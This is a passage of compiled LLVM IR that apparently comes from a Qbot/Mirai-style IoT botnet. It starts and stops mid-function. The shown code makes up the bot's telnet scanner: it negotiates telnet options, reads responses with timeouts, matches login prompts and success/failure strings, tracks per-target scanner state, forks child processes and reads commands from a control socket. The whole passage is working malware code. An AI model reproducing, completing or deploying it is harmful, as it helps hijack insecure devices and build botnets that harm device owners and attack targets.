; <label>:24:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 4096, i32 16, i1 false)
  %25 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %26 = icmp eq i8* %25, null
  br i1 %26, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %24
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %27 = call i32 @close(i32 %3) #3
  br label %28

; <label>:28:                                     ; preds = %._crit_edge, %21
  %.017 = phi i32 [ 0, %21 ], [ 1, %._crit_edge ]
  ret i32 %.017
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.307, i64 0, i64 0), i32 0) #3
  %3 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  %4 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %5 = icmp eq i8* %4, null
  br i1 %5, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.04 = phi i32 [ %..0, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  call void @uppercase(i8* nonnull %3)
  %strncmp = call i32 @strncmp(i8* nonnull %3, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.308, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  %6 = zext i1 %cmp to i32
  %..0 = add nsw i32 %6, %.04
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 4096, i32 16, i1 false)
  %7 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %8 = icmp eq i8* %7, null
  br i1 %8, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %.0.lcssa = phi i32 [ 0, %0 ], [ %..0, %._crit_edge.loopexit ]
  %9 = call i32 @close(i32 %2) #3
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  %8 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 0
  store i64 30, i64* %8, align 8
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 1
  store i64 0, i64* %9, align 8
  %10 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #3, !srcloc !3
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.__sigset_t* nonnull %4, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %4, %struct.timeval* nonnull %5) #3
  %22 = icmp sgt i32 %2, 1
  br i1 %22, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %31
  %.in = phi i32 [ %23, %31 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %32, %31 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %29, %31 ], [ %1, %.lr.ph.preheader ]
  %23 = add nsw i32 %.in, -1
  %24 = load i32, i32* @mainCommSock, align 4
  %25 = call i64 @recv(i32 %24, i8* nonnull %6, i64 1, i32 0) #3
  %26 = icmp eq i64 %25, 1
  br i1 %26, label %27, label %._crit_edge.loopexit

; <label>:27:                                     ; preds = %.lr.ph
  %28 = load i8, i8* %6, align 1
  %29 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %28, i8* %.01923, align 1
  %30 = icmp eq i8 %28, 10
  br i1 %30, label %._crit_edge.loopexit, label %31

; <label>:31:                                     ; preds = %27
  %32 = add nuw nsw i32 %.024, 1
  %33 = icmp sgt i32 %23, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %31, %27
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %29, %31 ], [ %29, %27 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %32, %31 ], [ %.024, %27 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) local_unnamed_addr #4

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t* nocapture readonly) local_unnamed_addr #1 {
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 1
  %3 = load i32, i32* %2, align 4
  %4 = tail call i8* @inet_ntoa(i32 %3) #3
  ret i8* %4
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t* nocapture, i32) local_unnamed_addr #1 {
  %3 = icmp eq i32 %1, 0
  br i1 %3, label %4, label %8

; <label>:4:                                      ; preds = %2
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 0
  %6 = load i32, i32* %5, align 8
  %7 = tail call i32 @close(i32 %6) #3
  br label %8

; <label>:8:                                      ; preds = %4, %2
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 7
  store i32 0, i32* %9, align 8
  %10 = trunc i32 %1 to i8
  %11 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 2
  store i8 %10, i8* %11, align 8
  %12 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 9
  %13 = load i8*, i8** %12, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %13, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) local_unnamed_addr #1 {
  %4 = alloca i8, align 1
  %5 = getelementptr inbounds i8, i8* %1, i64 1
  %6 = load i8, i8* %5, align 1
  %.off = add i8 %6, 5
  %switch = icmp ult i8 %.off, 4
  br i1 %switch, label %7, label %20

; <label>:7:                                      ; preds = %3
  store i8 -1, i8* %4, align 1
  %8 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %9 = load i8, i8* %5, align 1
  switch i8 %9, label %13 [
    i8 -4, label %10
    i8 -2, label %11
    i8 3, label %12
  ]

; <label>:10:                                     ; preds = %7
  store i8 -2, i8* %4, align 1
  br label %16

; <label>:11:                                     ; preds = %7
  store i8 -4, i8* %4, align 1
  br label %16

; <label>:12:                                     ; preds = %7
  store i8 -3, i8* %4, align 1
  br label %16

; <label>:13:                                     ; preds = %7
  %14 = icmp eq i8 %9, -3
  %15 = select i1 %14, i8 -4, i8 -2
  store i8 %15, i8* %4, align 1
  br label %16

; <label>:16:                                     ; preds = %11, %13, %12, %10
  %17 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %18 = getelementptr inbounds i8, i8* %1, i64 2
  %19 = call i64 @send(i32 %0, i8* %18, i64 1, i32 16384) #3
  br label %20

; <label>:20:                                     ; preds = %3, %16
  ret i32 0
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @contains_string(i8* readonly, i8** nocapture readonly) local_unnamed_addr #11 {
  br label %3

; <label>:3:                                      ; preds = %3, %2
  %indvars.iv13 = phi i64 [ %indvars.iv.next14, %3 ], [ 0, %2 ]
  %indvars.iv.next14 = add nuw nsw i64 %indvars.iv13, 1
  %4 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv.next14
  %5 = load i8*, i8** %4, align 8
  %6 = icmp eq i8* %5, null
  br i1 %6, label %.preheader, label %3

.preheader:                                       ; preds = %3
  %7 = trunc i64 %indvars.iv13 to i32
  %8 = icmp slt i32 %7, 0
  br i1 %8, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  %sext = shl i64 %indvars.iv13, 32
  %9 = ashr exact i64 %sext, 32
  br label %.lr.ph

; <label>:10:                                     ; preds = %.lr.ph
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %11 = icmp slt i64 %indvars.iv, %9
  br i1 %11, label %.lr.ph, label %._crit_edge.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %12 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv
  %13 = load i8*, i8** %12, align 8
  %14 = tail call i8* @strcasestr(i8* %0, i8* %13) #15
  %15 = icmp eq i8* %14, null
  br i1 %15, label %10, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %10
  %.09.ph = phi i32 [ 0, %10 ], [ 1, %.lr.ph ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.09 = phi i32 [ 0, %.preheader ], [ %.09.ph, %._crit_edge.loopexit ]
  ret i32 %.09
}

; Function Attrs: nounwind readonly
declare i8* @strcasestr(i8*, i8*) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  store i64 0, i64* %7, align 8
  %8 = sext i32 %1 to i64
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  store i64 %8, i64* %9, align 8
  %10 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #3, !srcloc !4
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %6) #3
  %22 = icmp slt i32 %21, 1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %4
  %24 = sext i32 %3 to i64
  %25 = call i64 @recv(i32 %0, i8* %2, i64 %24, i32 0) #3
  %26 = trunc i64 %25 to i32
  br label %27

; <label>:27:                                     ; preds = %4, %23
  %.0 = phi i32 [ %26, %23 ], [ 0, %4 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8** nocapture readonly) local_unnamed_addr #1 {
  %6 = sext i32 %3 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %2, i8 0, i64 %6, i32 1, i1 false)
  %7 = tail call i32 @read_with_timeout(i32 %0, i32 %1, i8* %2, i32 %3)
  %8 = tail call i32 @contains_string(i8* %2, i8** %4)
  %not. = icmp ne i32 %8, 0
  %.0 = zext i1 %not. to i32
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t* nocapture, i32) local_unnamed_addr #1 {
  %3 = icmp eq i32 %1, 0
  br i1 %3, label %4, label %8

; <label>:4:                                      ; preds = %2
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 0
  %6 = load i32, i32* %5, align 8
  %7 = tail call i32 @close(i32 %6) #3
  br label %8

; <label>:8:                                      ; preds = %4, %2
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 7
  store i32 0, i32* %9, align 8
  %10 = trunc i32 %1 to i8
  %11 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 2
  store i8 %10, i8* %11, align 8
  %12 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 9
  %13 = load i8*, i8** %12, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %13, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t* nocapture) local_unnamed_addr #1 {
  tail call void @advance_state(%struct.telstate_t* %0, i32 0)
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 3
  store i8 1, i8* %2, align 1
  ret void
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @contains_success(i8* readonly) local_unnamed_addr #11 {
  %2 = tail call i32 @contains_string(i8* %0, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @successes, i64 0, i64 0))
  ret i32 %2
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @contains_fail(i8* readonly) local_unnamed_addr #11 {
  %2 = tail call i32 @contains_string(i8* %0, i8** getelementptr inbounds ([9 x i8*], [9 x i8*]* @fails, i64 0, i64 0))
  ret i32 %2
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @contains_response(i8* readonly) local_unnamed_addr #11 {
  %2 = tail call i32 @contains_success(i8* %0)
  %3 = icmp eq i32 %2, 0
  br i1 %3, label %4, label %7

; <label>:4:                                      ; preds = %1
  %5 = tail call i32 @contains_fail(i8* %0)
  %6 = icmp ne i32 %5, 0
  br label %7

; <label>:7:                                      ; preds = %1, %4
  %8 = phi i1 [ true, %1 ], [ %6, %4 ]
  %9 = zext i1 %8 to i32
  ret i32 %9
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #3
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #18
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #18
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #3, !srcloc !5
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %6, %struct.__sigset_t* null, %struct.timeval* nonnull %7) #3
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #3
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #3
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #3
  %2 = icmp slt i32 %1, 1
  br i1 %2, label %23, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i32, i32* @numpids, align 4
  %5 = add nsw i32 %4, 1
  store i32 %5, i32* @numpids, align 4
  %6 = shl i32 %4, 2
  %7 = add i32 %6, 8
  %8 = sext i32 %7 to i64
  %9 = tail call noalias i8* @malloc(i64 %8) #3
  %10 = bitcast i8* %9 to i32*
  %11 = icmp sgt i32 %4, 0
  br i1 %11, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %12 = load i32*, i32** @pids, align 8
  %13 = getelementptr inbounds i32, i32* %12, i64 %indvars.iv
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %14, i32* %15, align 4
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %16 = load i32, i32* @numpids, align 4
  %17 = add nsw i32 %16, -1
  %18 = sext i32 %17 to i64
  %19 = icmp slt i64 %indvars.iv.next, %18
  br i1 %19, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.lcssa = phi i32 [ %4, %3 ], [ %17, %._crit_edge.loopexit ]
  %20 = sext i32 %.lcssa to i64
  %21 = getelementptr inbounds i32, i32* %10, i64 %20
  store i32 %1, i32* %21, align 4
  %22 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  tail call void @free(i8* %22) #3
  store i8* %9, i8** bitcast (i32** @pids to i8**), align 8
  br label %23

; <label>:23:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #5

; Function Attrs: noinline nounwind readonly uwtable
define i32 @matchPrompt(i8* nocapture readonly) local_unnamed_addr #11 {
.preheader:
  %1 = tail call i64 @strlen(i8* %0) #15
  %2 = trunc i64 %1 to i32
  %sext = shl i64 %1, 32
  %3 = ashr exact i64 %sext, 32
  %4 = getelementptr inbounds i8, i8* %0, i64 %3
  %sext29 = shl i64 %1, 32
  %5 = ashr exact i64 %sext29, 32
  %6 = getelementptr inbounds i8, i8* %0, i64 %5
  %sext41 = shl i64 %1, 32
  %7 = ashr exact i64 %sext41, 32
  %8 = icmp sgt i32 %2, 0
  br i1 %8, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.preheader.137:                                   ; preds = %.critedge
  %9 = icmp sgt i32 %2, %.1.lcssa
  br i1 %9, label %.lr.ph.preheader.1, label %.critedge.1

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.critedge1
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %.130 = phi i32 [ %14, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %10 = sub nsw i64 0, %indvars.iv
  %11 = getelementptr inbounds i8, i8* %6, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = trunc i64 %indvars.iv to i32
  switch i8 %12, label %.critedge.loopexit [
    i8 0, label %.critedge1
    i8 32, label %.critedge1
    i8 13, label %.critedge1
    i8 10, label %.critedge1
  ]

.critedge1:                                       ; preds = %.lr.ph, %.lr.ph, %.lr.ph, %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %14 = add nsw i32 %.130, 1
  %15 = icmp sgt i64 %7, %indvars.iv.next
  br i1 %15, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %.critedge1
  %.1.lcssa.ph = phi i32 [ %13, %.lr.ph ], [ %14, %.critedge1 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ 0, %.preheader ], [ %.1.lcssa.ph, %.critedge.loopexit ]
  %16 = sext i32 %.1.lcssa to i64
  %17 = sub nsw i64 0, %16
  %18 = getelementptr inbounds i8, i8* %4, i64 %17
  %19 = load i8, i8* %18, align 1
  %20 = icmp eq i8 %19, 58
  br i1 %20, label %21, label %.preheader.137

; <label>:21:                                     ; preds = %.critedge.3, %.critedge.2, %.critedge.1, %.critedge
  ret i32 1

.lr.ph.preheader.1:                               ; preds = %.preheader.137
  %22 = sext i32 %.1.lcssa to i64
  br label %.lr.ph.1

.lr.ph.1:                                         ; preds = %.critedge1.1, %.lr.ph.preheader.1
  %indvars.iv.1 = phi i64 [ %22, %.lr.ph.preheader.1 ], [ %indvars.iv.next.1, %.critedge1.1 ]
  %.130.1 = phi i32 [ %.1.lcssa, %.lr.ph.preheader.1 ], [ %27, %.critedge1.1 ]
  %23 = sub nsw i64 0, %indvars.iv.1
  %24 = getelementptr inbounds i8, i8* %6, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = trunc i64 %indvars.iv.1 to i32
  switch i8 %25, label %.critedge.1.loopexit [
    i8 0, label %.critedge1.1
    i8 32, label %.critedge1.1
    i8 13, label %.critedge1.1
    i8 10, label %.critedge1.1
  ]

.critedge1.1:                                     ; preds = %.lr.ph.1, %.lr.ph.1, %.lr.ph.1, %.lr.ph.1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv.1, 1
  %27 = add nsw i32 %.130.1, 1
  %28 = icmp sgt i64 %7, %indvars.iv.next.1
  br i1 %28, label %.lr.ph.1, label %.critedge.1.loopexit

.critedge.1.loopexit:                             ; preds = %.critedge1.1, %.lr.ph.1
  %.1.lcssa.1.ph = phi i32 [ %26, %.lr.ph.1 ], [ %27, %.critedge1.1 ]
  br label %.critedge.1

.critedge.1:                                      ; preds = %.critedge.1.loopexit, %.preheader.137
  %.1.lcssa.1 = phi i32 [ %.1.lcssa, %.preheader.137 ], [ %.1.lcssa.1.ph, %.critedge.1.loopexit ]
  %29 = sext i32 %.1.lcssa.1 to i64
  %30 = sub nsw i64 0, %29
  %31 = getelementptr inbounds i8, i8* %4, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = icmp eq i8 %32, 62
  br i1 %33, label %21, label %.preheader.238

.preheader.238:                                   ; preds = %.critedge.1
  %34 = icmp sgt i32 %2, %.1.lcssa.1
  br i1 %34, label %.lr.ph.preheader.2, label %.critedge.2

.lr.ph.preheader.2:                               ; preds = %.preheader.238
  %35 = sext i32 %.1.lcssa.1 to i64
  br label %.lr.ph.2

.lr.ph.2:                                         ; preds = %.critedge1.2, %.lr.ph.preheader.2
  %indvars.iv.2 = phi i64 [ %35, %.lr.ph.preheader.2 ], [ %indvars.iv.next.2, %.critedge1.2 ]
  %.130.2 = phi i32 [ %.1.lcssa.1, %.lr.ph.preheader.2 ], [ %40, %.critedge1.2 ]
  %36 = sub nsw i64 0, %indvars.iv.2
  %37 = getelementptr inbounds i8, i8* %6, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = trunc i64 %indvars.iv.2 to i32
  switch i8 %38, label %.critedge.2.loopexit [
    i8 0, label %.critedge1.2
    i8 32, label %.critedge1.2
    i8 13, label %.critedge1.2
    i8 10, label %.critedge1.2
  ]

.critedge1.2:                                     ; preds = %.lr.ph.2, %.lr.ph.2, %.lr.ph.2, %.lr.ph.2
  %indvars.iv.next.2 = add nsw i64 %indvars.iv.2, 1
  %40 = add nsw i32 %.130.2, 1
  %41 = icmp sgt i64 %7, %indvars.iv.next.2
  br i1 %41, label %.lr.ph.2, label %.critedge.2.loopexit

.critedge.2.loopexit:                             ; preds = %.critedge1.2, %.lr.ph.2
  %.1.lcssa.2.ph = phi i32 [ %39, %.lr.ph.2 ], [ %40, %.critedge1.2 ]
  br label %.critedge.2

.critedge.2:                                      ; preds = %.critedge.2.loopexit, %.preheader.238
  %.1.lcssa.2 = phi i32 [ %.1.lcssa.1, %.preheader.238 ], [ %.1.lcssa.2.ph, %.critedge.2.loopexit ]
  %42 = sext i32 %.1.lcssa.2 to i64
  %43 = sub nsw i64 0, %42
  %44 = getelementptr inbounds i8, i8* %4, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = icmp eq i8 %45, 37
  br i1 %46, label %21, label %.preheader.339

.preheader.339:                                   ; preds = %.critedge.2
  %47 = icmp sgt i32 %2, %.1.lcssa.2
  br i1 %47, label %.lr.ph.preheader.3, label %.critedge.3

.lr.ph.preheader.3:                               ; preds = %.preheader.339
  %48 = sext i32 %.1.lcssa.2 to i64
  br label %.lr.ph.3

.lr.ph.3:                                         ; preds = %.critedge1.3, %.lr.ph.preheader.3
